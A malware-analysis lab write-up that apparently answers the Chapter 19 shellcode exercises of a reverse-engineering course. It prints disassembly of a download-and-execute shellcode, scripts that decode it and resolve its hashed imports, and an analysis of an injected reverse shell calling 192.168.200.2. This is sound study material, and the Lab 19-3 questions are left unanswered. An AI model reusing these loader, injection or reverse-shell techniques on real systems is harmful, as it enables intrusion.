# Lab 19 - Shellcode Analysis

In these labs, we’ll use what we’ve covered in Chapter 19 to analyze samples inspired by real shellcode. Because a debugger cannot easily load and run shellcode directly, we’ll use a utility called shellcode_launcher.exe to dynamically analyze shellcode binaries. You’ll find instructions on how to use this utility in Chapter 19 and in the detailed analyses in Appendix C.

## Lab 19-1

Analyze the file Lab19-01.bin using shellcode_launcher.exe.

**1. How is the shellcode encoded?**

First we load the binary into _IDA Pro_ to see what it hides.

```
seg000:00000000                 inc     ecx
					...
seg000:000001FE                 inc     ecx
seg000:000001FF                 inc     ecx
seg000:00000200                 xor     ecx, ecx
seg000:00000202                 mov     cx, 18Dh			-> ECX = 18Dh
seg000:00000206                 jmp     short loc_21F
seg000:00000208
seg000:00000208 ; =============== S U B R O U T I N E =======================================
seg000:00000208
seg000:00000208
seg000:00000208 sub_208         proc near               ; CODE XREF: seg000:loc_21F↓p
seg000:00000208                 pop     esi
seg000:00000209                 push    esi
seg000:0000020A                 mov     edi, esi
seg000:0000020C
seg000:0000020C loc_20C:                                ; CODE XREF: sub_208+14↓j
seg000:0000020C                 lodsb
seg000:0000020D                 mov     dl, al
seg000:0000020F                 sub     dl, 41h ; 'A'
seg000:00000212                 shl     dl, 4
seg000:00000215                 lodsb
seg000:00000216                 sub     al, 41h ; 'A'
seg000:00000218                 add     al, dl
seg000:0000021A                 stosb
seg000:0000021B                 dec     ecx
seg000:0000021C                 jnz     short loc_20C
seg000:0000021E                 retn
seg000:0000021E sub_208         endp
seg000:0000021E
seg000:0000021F ; ---------------------------------------------------------------------------
seg000:0000021F
seg000:0000021F loc_21F:                                ; CODE XREF: seg000:00000206↑j
seg000:0000021F                 call    sub_208
seg000:00000224                 dec     ecx
```

As we can see, first we have a block of _0x200_ bytes of _inc ecx_ instructions, something that is useless since at _0x00000200_ the binary executes a _xor ecx, ecx_ instruction. So we can conclude that this block of code is just a _NOP sled_ but without using the _0x90_ opcode.

Then, the binary adds the value _0x18D_ to _ECX_ and jumps to the instruction located at _0x0000021F_, which will call to the function at _0x00000208_.

![_IDA Pro_ main function](../Pictures/Lab_19/lab_19-01_1_ida_pro_1.png)

This function is a loop that will execute the following instructions:

```
lodsb			-> AL = [SI] (ESI + 1)
mov     dl, al		-> DL = AL
sub     dl, 41h ; 'A'	-> DL = DL - 0x41
shl     dl, 4		-> DL = DL << 4
lodsb			-> AL = [SI] (ESI + 1)
sub     al, 41h ; 'A'	-> AL = AL - 0x41
add     al, dl		-> AL = AL + DL
stosb			-> [DI] = AL (EDI + 1)
dec     ecx		-> ECX = ECX - 1 (Initial ECX value is 0x8D = 141)
jnz     short loc_20C
```

Before that, we have to take in mind that the following instructions are executed:

```
pop     esi		-> ESI = ESP = return address = 0x00000224
push    esi
mov     edi, esi	-> EDI = ESI = ESP = 0x00000224
```

So now that we know the value of _ESI_ and _EDI_ is _ESP_ and _ESP_ point to the data after the call instruction, we can see that this routine seems to decode the next part of the binary, composed by 141 bytes.

So let's write a _Python_ decoder:

```
MAX_VALUE = 0xFF

def decrypt_file():
	decoded_bytes = bytearray()
	key = 0x41
	counter = 0x18D

	with open("Scripts/Labs/Lab_19/lab19-01.bin", "rb") as encoded_file:
		encoded_file.seek(0x224)
		encoded_byte = encoded_file.read(1)

		while counter > 0:
			value_1 = (((int.from_bytes(encoded_byte, byteorder="big") - key) & MAX_VALUE) << 4) & MAX_VALUE
			encoded_byte = encoded_file.read(1)

			value_2 = (int.from_bytes(encoded_byte, byteorder="big") - key) & MAX_VALUE
			decoded_byte = (value_2 + value_1) & MAX_VALUE
			decoded_bytes.append(decoded_byte)

			counter = counter - 1
			encoded_byte = encoded_file.read(1)

	return decoded_bytes

def save_decrypted_file(decoded_bytes):
	decoded_file = open("Scripts/Labs/Lab_19/lab19-01_stage_2.bin", "wb")
	decoded_file.write(decoded_bytes)

decoded_bytes = decrypt_file()
save_decrypted_file(decoded_bytes)
```

We execute it...

```
python3 Scripts/Labs/Lab_19/lab19_01_decode_next_stage.py
```

Great! We have decoding the second stage!

![_IDA Pro_ main function](../Pictures/Lab_19/lab_19-01_1_ida_pro_2.png)

**2. Which functions does the shellcode manually import?**

To know what functions the sample imports, we need to analyze the second stage of the shellcode.

The first instructions executed are the following:

```
seg000:00000000                 mov     ebp, esp
seg000:00000002                 sub     esp, 40h
seg000:00000008                 jmp     loc_140
```

As we can see, the execution flow goes to the offset _0x00000140_, which will execute:

```
seg000:00000140                 call    loc_9B
```

A call instruction to _loc_9B_:

```
seg000:0000009B loc_9B:
seg000:0000009B                 pop     ebx					-> EBX = return address = 0x00000145
seg000:0000009C                 call    loc_7A
...
```

This function seems to have some hashes, but before the execution flow gets there, two instructions are executed first. The first one will pop the return address of the previous call (_0x00000145_) to _EBX_, which it points to some interesting strings:

```
seg000:00000145 aUrlmon         db 'URLMON',0
seg000:0000014C aHttpWwwPractic db 'http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe',0
```

The second one will redirect the execution flow to a new routine _loc_7A_, which is as follows:

```
seg000:0000007A loc_7A:                                 ; CODE XREF: seg000:0000009C↓p
seg000:0000007A                 push    esi
seg000:0000007B                 xor     eax, eax
seg000:0000007D                 mov     eax, fs:[eax+30h]		-> PEB
seg000:00000081                 test    eax, eax
seg000:00000083                 js      short loc_94
seg000:00000085                 mov     eax, [eax+0Ch]			-> EAX = PEB_LDR
seg000:00000088                 mov     esi, [eax+1Ch]			-> ESI = InInitializationOrderModuleList (pointer to LDR_DATA_TABLE_ENTRY[0x10])
seg000:0000008B                 lodsd					-> EAX = ESI = LDR_DATA_TABLE_ENTRY[0x10] 
seg000:0000008C                 mov     eax, [eax+8]			-> EAX = LDR_DATA_TABLE_ENTRY[0x10 + 0x8] = DllBase
seg000:0000008F                 jmp     loc_99
seg000:00000094 ; ---------------------------------------------------------------------------
seg000:00000094
seg000:00000094 loc_94:                                 ; CODE XREF: seg000:00000083↑j
seg000:00000094                                         ; seg000:loc_94↓j
seg000:00000094                 jmp     loc_94				-> Infinit loop
seg000:00000099 ; ---------------------------------------------------------------------------
seg000:00000099
seg000:00000099 loc_99:                                 ; CODE XREF: seg000:0000008F↑j
seg000:00000099                 pop     esi
seg000:0000009A                 retn
```

First, this function will locate the _PEB_ struct in the _TEB_ struct at offset _0x30_. Then, at offset _0xC_ in the _PEB_ structure the pointer to the _PEB_LDR_DATA_ structure is obtained. After that, at offset _0x1C_ in the _PEB_LDR_DATA_ structure, a pointer to the _LDR_DATA_TABLE_ENTRY_ called _InInitializationOrderModuleList_ is accessed, this piece of data will also point to another _LDR_DATA_TABLE_ENTRY_ plus _0x10_. Finally, it will obtain the value of _DllBase_ at offset _0x8_, which corresponds to the _DllBase_ value of _kernel32.dll_ in _WindowsXP_. Notice that if the function fails to get the _PEB_ struct, it will run forever in an infinit loop.

![_Book_ _kernel32.dll_ _DLLBase_](../Pictures/Lab_19/lab_19-01_2_book_1.png)

Then, it will return to the previous function at this point:

```
seg000:000000A1                 mov     edx, eax
seg000:000000A3                 push    0EC0E4E8Eh
seg000:000000A8                 push    edx
seg000:000000A9                 call    sub_2E
seg000:000000AE                 mov     [ebp-4], eax
seg000:000000B1                 push    0B8E579C1h
seg000:000000B6                 push    edx
seg000:000000B7                 call    sub_2E
seg000:000000BC                 mov     [ebp-8], eax
seg000:000000BF                 push    78B5B983h
seg000:000000C4                 push    edx
seg000:000000C5                 call    sub_2E
seg000:000000CA                 mov     [ebp-0Ch], eax
seg000:000000CD                 push    7B8F17E6h
seg000:000000D2                 push    edx
seg000:000000D3                 call    sub_2E
seg000:000000D8                 mov     [ebp-10h], eax
seg000:000000DB                 push    0E8AFE98h
seg000:000000E0                 push    edx
seg000:000000E1                 call    sub_2E
seg000:000000E6                 mov     [ebp-14h], eax
seg000:000000E9                 lea     eax, [ebx]
seg000:000000EB                 push    eax
seg000:000000EC                 call    dword ptr [ebp-4]
seg000:000000EF                 push    702F1A36h
seg000:000000F4                 push    eax
seg000:000000F5                 call    sub_2E
seg000:000000FA                 mov     [ebp-18h], eax
seg000:000000FD                 push    80h
seg000:00000102                 lea     edi, [ebx+48h]
seg000:00000105                 push    edi
seg000:00000106                 call    dword ptr [ebp-8]
seg000:00000109                 add     edi, eax
seg000:0000010B                 mov     dword ptr [edi], 652E315Ch
seg000:00000111                 mov     dword ptr [edi+4], 6578h
seg000:00000118                 xor     ecx, ecx
seg000:0000011A                 push    ecx
seg000:0000011B                 push    ecx
seg000:0000011C                 lea     eax, [ebx+48h]
seg000:0000011F                 push    eax
seg000:00000120                 lea     eax, [ebx+7]
seg000:00000123                 push    eax
seg000:00000124                 push    ecx
seg000:00000125                 call    dword ptr [ebp-18h]
seg000:00000128                 push    5
seg000:0000012D                 lea     eax, [ebx+48h]
seg000:00000130                 push    eax
seg000:00000131                 call    dword ptr [ebp-14h]
seg000:00000134                 call    dword ptr [ebp-10h]
seg000:00000137                 push    0
seg000:0000013C                 push    eax
seg000:0000013D                 call    dword ptr [ebp-0Ch]
```

As we can see, the function _sub_2E_ is called 6 times in this function, also we check how it passes two arguments:

```
mov     edx, eax	-> EDX = kernel32.dll DllBase
push    0EC0E4E8Eh	-> Hash
push    edx		-> kernel32.dll DllBase
call    sub_2E
```

These two arguments are some kind of hash and the previously obtained _kernel32.dll_ _DLLBase_. Let's see what this funcion hides:

![_IDA Pro_ function _sub_2E_](../Pictures/Lab_19/lab_19-01_2_ida_pro_1.png)

It seems that it performs some function search over the _IMAGE_EXPORT_DIRECTORY_ struct of _kernel32.dll_. Notice that a new function (_sub_D_) is called, it seems to be the hashing function. Let's dig into it and see if we can replicate it in a _Python_ script.

![_IDA Pro_ function _sub_D_](../Pictures/Lab_19/lab_19-01_2_ida_pro_2.png)

```
import os
import sys

hashes = [
	0xEC0E4E8E,
	0xB8E579C1,
	0x78B5B983,
	0x7B8F17E6,
	0xE8AFE98,
	0x702F1A36
]

MAX_VALUE = 0xFFFFFFFF
INT_BITS = 32

# Left rotate of bits
def rotr(num, bits):
	return ((num >> bits)|(num << (INT_BITS - bits))) & MAX_VALUE

def get_hash(function_name):
	result = 0
	counter = 0
	while counter < len(function_name):
		result = (rotr(result, 0xD) + ord(function_name[counter])) & MAX_VALUE
		counter = counter + 1

	return result

def check_hash(function_name, hash_value):
	return get_hash(function_name) == hash_value

# Reads the file
def read_file(file):
	for hash_value in hashes:
		found = False
		with open(file, "r") as wordlist:
			function_name = wordlist.readline().rstrip('\n')
			while function_name and not found:
				found = check_hash(function_name, hash_value)
				if not found:
					function_name = wordlist.readline().rstrip('\n')

			if found:
				print("Occurrence found! The decrypted hash " + hex(hash_value) + " is: " + function_name)
			else:
				print("No occurrence found for hash " + hex(hash_value) + "!")

# Gets file from args
def get_file_from_args():
	if len(sys.argv) == 2:
		filename = sys.argv[1]
		if os.path.exists(filename):
			return filename

file = get_file_from_args()
if file:
	read_file(file)
else:
	print("Please provide a wordlist")
```

Now, we need to create a wordlist of exported functions of _kernel32.dll_ (_Windows XP_ version), to do so we use the script _get_file_exports.py_:

```
C:\> python get_file_exports.py kernel32.dll

######################
EXPORTS
######################
ActivateActCtx
AddAtomA
AddAtomW
AddConsoleAliasA
AddConsoleAliasW
...
lstrcpyn
lstrcpynA
lstrcpynW
lstrlen
lstrlenA
lstrlenW
```

The complete list is composed by 953 exports!

So now, we execute our script using this wordlist as follows (some changes may have to be done, since this script is also used in other exercises):

```
$ python3 Scripts/Labs/Lab_19/lab19_hashing_function.py Scripts/Labs/Lab_19/kernel32_exports.txt

Occurrence found! The decrypted hash 0xec0e4e8e is: LoadLibraryA
Occurrence found! The decrypted hash 0xb8e579c1 is: GetSystemDirectoryA
Occurrence found! The decrypted hash 0x78b5b983 is: TerminateProcess
Occurrence found! The decrypted hash 0x7b8f17e6 is: GetCurrentProcess
Occurrence found! The decrypted hash 0xe8afe98 is: WinExec
No occurrence found for hash 0x702f1a36!
```

Great! We have identified almost every function call, only the one with the value _0x702f1a36_ is unknown, may be because it is located in other library. Let's see what happens in the function _loc_9B_.

```
seg000:000000E9                 lea     eax, [ebx]
seg000:000000EB                 push    eax		; URLMON
seg000:000000EC                 call    dword ptr [ebp-4] ; LoadLibraryA
seg000:000000EF                 push    702F1A36h
seg000:000000F4                 push    eax
seg000:000000F5                 call    sub_2E
```

As we can see, the shellcode will call _LoadLibraryA_ using the string _URLMON_ pointed by _EBX_. So we need to get the exports of _urlmon.dll_ in order to get the last import:

```
C:\> python get_file_exports.py urlmon.dll

######################
EXPORTS
######################
AsyncGetClassBits
AsyncInstallDistributionUnit
BindAsyncMoniker
...
UrlMkSetSessionOption
WriteHitLogging
ZonesReInit
```

In this case, the library has a total of 86 functions, let's see if now we get the last import (some changes may have to be done, since this script is also used in other exercises):

```
$ python3 Scripts/Labs/Lab_19/lab19_hashing_function.py Scripts/Labs/Lab_19/urlmon_exports.txt

No occurrence found for hash 0xec0e4e8e!
No occurrence found for hash 0xb8e579c1!
No occurrence found for hash 0x78b5b983!
No occurrence found for hash 0x7b8f17e6!
No occurrence found for hash 0xe8afe98!
Occurrence found! The decrypted hash 0x702f1a36 is: URLDownloadToFileA
```

Great! We have found the last function!

Now, the function _sub_9B_ looks like this:

```
seg000:0000009B loc_9B:                                 ; CODE XREF: seg000:loc_140↓p
seg000:0000009B                 pop     ebx
seg000:0000009C                 call    loc_7A
seg000:000000A1                 mov     edx, eax
seg000:000000A3                 push    0EC0E4E8Eh      ; LoadLibraryA
seg000:000000A8                 push    edx
seg000:000000A9                 call    sub_2E
seg000:000000AE                 mov     [ebp-4], eax
seg000:000000B1                 push    0B8E579C1h      ; GetSystemDirectoryA
seg000:000000B6                 push    edx
seg000:000000B7                 call    sub_2E
seg000:000000BC                 mov     [ebp-8], eax
seg000:000000BF                 push    78B5B983h       ; TerminateProcess
seg000:000000C4                 push    edx
seg000:000000C5                 call    sub_2E
seg000:000000CA                 mov     [ebp-0Ch], eax
seg000:000000CD                 push    7B8F17E6h       ; GetCurrentProcess
seg000:000000D2                 push    edx
seg000:000000D3                 call    sub_2E
seg000:000000D8                 mov     [ebp-10h], eax
seg000:000000DB                 push    0E8AFE98h       ; WinExec
seg000:000000E0                 push    edx
seg000:000000E1                 call    sub_2E
seg000:000000E6                 mov     [ebp-14h], eax
seg000:000000E9                 lea     eax, [ebx]
seg000:000000EB                 push    eax            	; URLMON
seg000:000000EC                 call    dword ptr [ebp-4] ; LoadLibraryA
seg000:000000EF                 push    702F1A36h       ; URLDownloadToFileA
seg000:000000F4                 push    eax
seg000:000000F5                 call    sub_2E
seg000:000000FA                 mov     [ebp-18h], eax
seg000:000000FD                 push    80h
seg000:00000102                 lea     edi, [ebx+48h]
seg000:00000105                 push    edi
seg000:00000106                 call    dword ptr [ebp-8] ; GetSystemDirectoryA
seg000:00000109                 add     edi, eax
seg000:0000010B                 mov     dword ptr [edi], 652E315Ch	; 'e.1\'
seg000:00000111                 mov     dword ptr [edi+4], 6578h	; 'ex'
seg000:00000118                 xor     ecx, ecx
seg000:0000011A                 push    ecx
seg000:0000011B                 push    ecx
seg000:0000011C                 lea     eax, [ebx+48h]
seg000:0000011F                 push    eax
seg000:00000120                 lea     eax, [ebx+7]
seg000:00000123                 push    eax
seg000:00000124                 push    ecx
seg000:00000125                 call    dword ptr [ebp-18h] ; URLDownloadToFileA
seg000:00000128                 push    5
seg000:0000012D                 lea     eax, [ebx+48h]
seg000:00000130                 push    eax
seg000:00000131                 call    dword ptr [ebp-14h] ; WinExec
seg000:00000134                 call    dword ptr [ebp-10h] ; GetCurrentProcess
seg000:00000137                 push    0
seg000:0000013C                 push    eax
seg000:0000013D                 call    dword ptr [ebp-0Ch] ; TerminateProcess
```

**3. What network host does the shellcode communicate with?**

The shellcode will call _URLDownloadToFileA_ to download a file from _http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe_.

```
seg000:0000011A                 push    ecx
seg000:0000011B                 push    ecx
seg000:0000011C                 lea     eax, [ebx+48h]
seg000:0000011F                 push    eax
seg000:00000120                 lea     eax, [ebx+7]	; http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
seg000:00000123                 push    eax	; szURL = http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
seg000:00000124                 push    ecx
seg000:00000125                 call    dword ptr [ebp-18h] ; URLDownloadToFileA
```

**4. What filesystem residue does the shellcode leave?**

We can see in function _sub_9B_ how the sample calls _GetSystemDirectoryA_ prior to do this:

```
seg000:00000102                 lea     edi, [ebx+48h]
seg000:00000105                 push    edi
seg000:00000106                 call    dword ptr [ebp-8] ; GetSystemDirectoryA
seg000:00000109                 add     edi, eax
seg000:0000010B                 mov     dword ptr [edi], 652E315Ch	; 'e.1\'
seg000:00000111                 mov     dword ptr [edi+4], 6578h	; 'ex'
```

As we can see, it will get the system directory and append a filename to it, resulting in:

```
C:\Windows\System32\1.exe
```

Then, it will call _URLDownloadToFileA_ to download a file to this location.

```
seg000:0000011A                 push    ecx
seg000:0000011B                 push    ecx
seg000:0000011C                 lea     eax, [ebx+48h]	; 'C:\Windows\System32\1.exe'
seg000:0000011F                 push    eax	; szFileName = 'C:\Windows\System32\1.exe'
seg000:00000120                 lea     eax, [ebx+7]	; http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
seg000:00000123                 push    eax	; szURL = http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
seg000:00000124                 push    ecx
seg000:00000125                 call    dword ptr [ebp-18h] ; URLDownloadToFileA
```

**5. What does the shellcode do?**

The shellcode will download a binary file from _http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe_, it will save it in the file "C:\Windows\System32\1.exe" (as explained) and then it will execute it by means of _WinExec_:

```
seg000:0000012D                 lea     eax, [ebx+48h]	; 'C:\Windows\System32\1.exe'
seg000:00000130                 push    eax	; lpCmdLine = 'C:\Windows\System32\1.exe'
seg000:00000131                 call    dword ptr [ebp-14h] ; WinExec
```

Finally, the sample will terminate as follows:

```
seg000:00000134                 call    dword ptr [ebp-10h] ; GetCurrentProcess
seg000:00000137                 push    0
seg000:0000013C                 push    eax
seg000:0000013D                 call    dword ptr [ebp-0Ch] ; TerminateProcess
```

## Lab 19-2

The file Lab19-02.exe contains a piece of shellcode that will be injected into another process and run. Analyze this file.

**1. What process is injected with the shellcode?**

First, the malware will enable the _SeDebugPrivilege_ that will allow to inject the shellcode into some process at function _enable_privilege_ (_0x004010B0_).

![_IDA Pro_ _enable_privilege_ calling](../Pictures/Lab_19/lab_19-02_1_ida_pro_2.png)

Then, it will get the path of the default browser by means of the "\http\shell\open\command" registry key, in our case, _Internet Explorer_, in the function _get_browser_path_ (_0x00401000_).

![_IDA Pro_ _get_browser_path_](../Pictures/Lab_19/lab_19-02_1_ida_pro_2.png)

Once the sample has the path, it will spawn a new process in the routine called _create_process_ (_0x0401180_) using this path and then, it will inject some data into this process at _inject_process_ function (_0x00401230_).

![_IDA Pro_ spawn and inject process](../Pictures/Lab_19/lab_19-02_1_ida_pro_3.png)

**2. Where is the shellcode located?**

We need to analyze the function _inject_process_ (_0x00401230_) to see where the shellcode is located.

In the function we can see the classical process injection using _OpenProcess_, _VirtualAllocEx_, _WriteProcessMemory_ and _CreateRemoteThread_.

![_IDA Pro_ process injection](../Pictures/Lab_19/lab_19-02_2_ida_pro_1.png)

Now, to get the piece of shellcode we need analyze how the sample calls _WriteProcessMemory_.

![_IDA Pro_ _WriteProcessMemory_ calling](../Pictures/Lab_19/lab_19-02_2_ida_pro_2.png)

As we can see, the variable _lpBuffer_ is a pointer to a buffer that contains the shellcode. If we track this variable backwards, we can see how it is passed to the _inject_process_ function as argument in a variable called _unk_407030_ (_0x7030_). Also, we can see its size, 423 (_0x1A7_).

![_IDA Pro_ _unk_407030_](../Pictures/Lab_19/lab_19-02_2_ida_pro_3.png)

If we take a look to what it stores, we can see the shellcode, so we rename this variable as so.

![_IDA Pro_ _shellcode_](../Pictures/Lab_19/lab_19-02_2_ida_pro_4.png)


**3. How is the shellcode encoded?**

First, before starting the analysis, we decide to extract the shellcode into a new binary file, we use script we have developed to do so located at `Scripts/General/extract_shellcode.py` to do so. We only need to know the offset where the shellcode is located (_0x7030_) and its size (423):

```
$ python3 Scripts/General/extract_shellcode.py Scripts/Labs/Lab_19/Lab19-02.exe 0x7030 423
[+] Shellcode successfully extracted
[+] Shellcode successfully saved in the file: Scripts/Labs/Lab_19/Lab19-02.bin
```

Great! We can now load it in _IDA Pro_ and see what it does.

![_IDA Pro_ shellcode 1](../Pictures/Lab_19/lab_19-02_3_ida_pro_1.png)

The first executed instruction is:

```
seg000:00000000                 jmp     short loc_13
```

This will jump to a call instruction at _0x13_:

```
seg000:00000013 loc_13:                                 ; CODE XREF: seg000:00000000↑j
seg000:00000013                 call    loc_2
```

This call instruction executes the function at _0x02_:

```
seg000:00000002 loc_2:                                  ; CODE XREF: seg000:loc_13↓p
seg000:00000002                 pop     edi		-> Pointer to return address: 0x18
seg000:00000003                 push    small 18Fh
seg000:00000007                 pop     cx		-> CX = 0x18F -> EXC = 0x18F = 399
seg000:00000009                 mov     al, 0E7h	-> AL = 0xE7
seg000:0000000B
seg000:0000000B loc_B:                                  ; CODE XREF: seg000:0000000E↓j
seg000:0000000B                 xor     [edi], al	-> EDI[counter] = EDI[counter] ^ AL
seg000:0000000D                 inc     edi		-> counter = counter + 1
seg000:0000000E                 loopw   loc_B		-> ECX = ECX + 1 | jump to 0xB
seg000:00000011                 jmp     short loc_18	-> Jump to decoded code
```

As we can see, it's a loop that iterates 399 (_0x18F_) times over the code after the call instruction applying a XOR operation with _0xE7_ as key.

We reproduce this behaviour in the following python script:

```
MAX_VALUE = 0xFF

def decrypt_file():
	decoded_bytes = bytearray()
	key = 0xE7
	counter = 0x18F

	with open("Scripts/Labs/Lab_19/lab19-02.bin", "rb") as encoded_file:
		encoded_file.seek(0x18)
		encoded_byte = int.from_bytes(encoded_file.read(1), byteorder="big")

		while counter > 0:
			decoded_byte = (encoded_byte ^ key) & MAX_VALUE
			decoded_bytes.append(decoded_byte)

			counter = counter - 1
			encoded_byte = int.from_bytes(encoded_file.read(1), byteorder="big")

	return decoded_bytes

def save_decrypted_file(decoded_bytes):
	decoded_file = open("Scripts/Labs/Lab_19/lab19-02_stage_2.bin", "wb")
	decoded_file.write(decoded_bytes)

decoded_bytes = decrypt_file()
save_decrypted_file(decoded_bytes)
```

To execute it, we just:

```
$ python3 Scripts/Labs/Lab_19/lab19_02_decode_next_stage.py
```

Now, we can open it with IDA Pro as any regular binary file.

![_IDA Pro_ shellcode stage 2](../Pictures/Lab_19/lab_19-02_3_ida_pro_2.png)

**4. Which functions does the shellcode manually import?**

We have to analyze what the shellcode does first, before importing any function.

First, it will jump to a call instruction at _0x16E_:

```
seg000:00000008                 jmp     loc_16E
...
seg000:0000016E                 call    loc_9B
```

This call instruction will execute the following piece of code at _0x9B_:

```
seg000:0000009B                 pop     esi		-> Pointer to return address at 0x173
seg000:0000009C                 mov     ebx, esi	-> EBX = pointer to return address at 0x173
seg000:0000009E                 mov     edi, esi	-> EDI = pointer to return address at 0x173
seg000:000000A0                 call    sub_7A
```

As we can see, a pointer to return address (_0x173_) of the call instruction is stored in _ESI_, also this value is stored in _EBX_ and _EDI_. Then, it will call a function at _0x7A_.

![_IDA Pro_ _kernel32.dll_ _DllBase_](../Pictures/Lab_19/lab_19-02_4_ida_pro_1.png)

As we can see, is the same routine of the previous shellcode to get the _kernel32.dll_ _DllBase_ address.

When the function returns, it will store the result into _EDX_, aside from _EAX_, and store the value 4 in _ECX_.

```
seg000:000000A5                 mov     edx, eax
seg000:000000A7                 mov     ecx, 4
```

Then, it will loop as follows 4 times (value of _ECX_).

```
seg000:000000AC loc_AC:                                 ; CODE XREF: seg000:000000B5↓j
seg000:000000AC                 lodsd
seg000:000000AD                 push    eax             ; EAX = value of address at 0x173
seg000:000000AE                 push    edx             ; kernel32 DllBase
seg000:000000AF                 call    sub_2E
seg000:000000B4                 stosd
seg000:000000B5                 loop    loc_AC
```

It will load the value stored at _0x173_ (the value of _ESI_) and then call the function at _0x2E_.

![_IDA Pro_ _kernel32.dll_ _DllBase_](../Pictures/Lab_19/lab_19-02_4_ida_pro_2.png)

As we can see, is the same function that will loop over the _IMAGE_EXPORT_DIRECTORY_ struct of _kernel32.dll_ to get the address of the needed functions. Also, the function _sub_D_ 

![_IDA Pro_ hashing function](../Pictures/Lab_19/lab_19-02_4_ida_pro_3.png)

As we can see, is the same hashing function used in the previous exercise.

So now, we can use the same script of the exercise 1 to get the imported functions, but first, we need to get the hashes at _0x173_:

```
seg000:00000173                 db 8Eh
seg000:00000174                 db  4Eh ; N
seg000:00000175                 db  0Eh
seg000:00000176                 db 0ECh
seg000:00000177                 db  72h ; r
seg000:00000178                 db 0FEh
seg000:00000179                 db 0B3h
seg000:0000017A                 db  16h
seg000:0000017B                 db  83h
seg000:0000017C                 db 0B9h
seg000:0000017D                 db 0B5h
seg000:0000017E                 db  78h ; x
seg000:0000017F                 db 0E6h
seg000:00000180                 db  17h
seg000:00000181                 db  8Fh
seg000:00000182                 db  7Bh
```

We have selected the 16 bytes that composes the 4 hashes (4 bytes each element). So the hashes are (click 'D' key 2 times):

```
seg000:00000173                 dd 0EC0E4E8Eh
seg000:00000177                 dd 16B3FE72h
seg000:0000017B                 dd 78B5B983h
seg000:0000017F                 dd 7B8F17E6h
```

We use the wordlist of _kernel32.dll_ exported functions in the script and (some changes may have to be done, since this script is also used in other exercises)...

```
$ python3 Scripts/Labs/Lab_19/lab19_hashing_function.py Scripts/Labs/Lab_19/kernel32_exports.txt

Occurrence found! The decrypted hash 0xec0e4e8e is: LoadLibraryA
Occurrence found! The decrypted hash 0x16b3fe72 is: CreateProcessA
Occurrence found! The decrypted hash 0x78b5b983 is: TerminateProcess
Occurrence found! The decrypted hash 0x7b8f17e6 is: GetCurrentProcess
```

Great! But... We have to check if this hashing function is used again, to see if the sample imports some other functions.

So after executing the function _sub_2E_, the shellcode will execute the following instruction:

```
seg000:000000B4                 stosd
```

This will store the value at _EAX_ (the address of the imported function) to the address pointed by registry _EDI_ and, if we remember, _EDI_ will point to the same loacation of _ESI_ and _EBX_, the address at _0x173_.

So now, the next instructions the sample will execute are:

```
seg000:000000B7                 push    3233h           ; '23'
seg000:000000BC                 push    5F327377h       ; '_2sw'
seg000:000000C1                 push    esp
seg000:000000C2                 call    dword ptr [ebx] ; LoadLibraryA
seg000:000000C4                 mov     edx, eax
seg000:000000C6                 mov     ecx, 3
seg000:000000CB
seg000:000000CB loc_CB:                                 ; CODE XREF: seg000:000000D4↓j
seg000:000000CB                 lodsd
seg000:000000CC                 push    eax
seg000:000000CD                 push    edx
seg000:000000CE                 call    sub_2E		; look for funtions
seg000:000000D3                 stosd
seg000:000000D4                 loop    loc_CB
```

As we can see, it will use _LoadLibraryA_ to load the library _ws2_32_ (take in mind little endian). Then it will loop 3 times over its _IMAGE_EXPORT_DIRECTORY_ struct using the hashes stored after the ones located at _0x173_ to get the expected functions. The hashes that will use are:

```
seg000:00000183                 dd 3BFCEDCBh
seg000:00000187                 dd 0ADF509D9h
seg000:0000018B                 dd 60AAF9ECh
```

We get the exported functions of such library _ws2_32_, we introduce the hashes into the script and then we execute it (some changes may have to be done, since this script is also used in other exercises):

```
$ python3 Scripts/Labs/Lab_19/lab19_hashing_function.py Scripts/Labs/Lab_19/ws2_32_exports.txt 

Occurrence found! The decrypted hash 0x3bfcedcb is: WSAStartup
Occurrence found! The decrypted hash 0xadf509d9 is: WSASocketA
Occurrence found! The decrypted hash 0x60aaf9ec is: connect
```

Then, as seen before, the result will be stored as the previous functions.

So now, we can fully analyze the rest of the shellcode.

**5. What network hosts does the shellcode communicate with?**

We need to analyze the main code of the shellcode to understand this.

![_IDA Pro_ main code](../Pictures/Lab_19/lab_19-02_5_ida_pro_1.png)

As we can see, the shellcode will use the well known _WSAStartup_, _WSASocketA_ and _connect_ to connect to a remote host, but which host exactly?

We have to analyze the _connect_ call to find it:

```
seg000:00000104                 push    2C8A8C0h
seg000:00000109                 push    12340002h
seg000:0000010E                 mov     ecx, esp
seg000:00000110                 push    10h
seg000:00000115                 push    ecx
seg000:00000116                 push    eax
seg000:00000117                 call    dword ptr [ebx+18h] ; connect
```

As we can see, it uses a _sockaddr_ struct to pass the host information. This struct is composed by:

```
struct sockaddr_in {
        short   sin_family;		-> 2 bytes
        u_short sin_port;		-> 2 bytes
        struct  in_addr sin_addr;
        char    sin_zero[8];
};
```

The struct value of the shellcode is:

```
2C8A8C012340002
```

This can be decomposed as follows (take in mind endianness):

```
0002	-> AF_INET
3412	-> 13330
C0	-> 192
A8	-> 168
C8	-> 200
02	-> 2

```

So now, we have the port and the _IP_ address:

```
192.168.200.2:13330
```

**6. What does the shellcode do?**

After connecting to the C&C, the shellcode will spawn a remote shell, but how?

It will setup the _PROCESS_STARTUP_INFO_ struct to redirect the _stdInput_, _stdOutput_ and _stdError_ to the _socket_. Also, it is important to notice how the shellcode sets the argument _bInheritHandles_ to 1, indicating that file handles opened by the shellcode will be available to the child process

![_IDA Pro_ main code](../Pictures/Lab_19/lab_19-02_6_ida_pro_1.png)

Finally, the current process will terminate.

![_IDA Pro_ terminate process](../Pictures/Lab_19/lab_19-02_6_ida_pro_2.png)

## Lab 19-3

Analyze the file Lab19-03.pdf. If you get stuck and can’t find the shellcode, just skip that part of the lab and analyze file Lab19-03_sc.bin using shellcode_launcher.exe.

**1. What exploit is used in this PDF?**

**2. How is the shellcode encoded?**

**3. Which functions does the shellcode manually import?**

**4. What filesystem residue does the shellcode leave?**

**5. What does the shellcode do?**
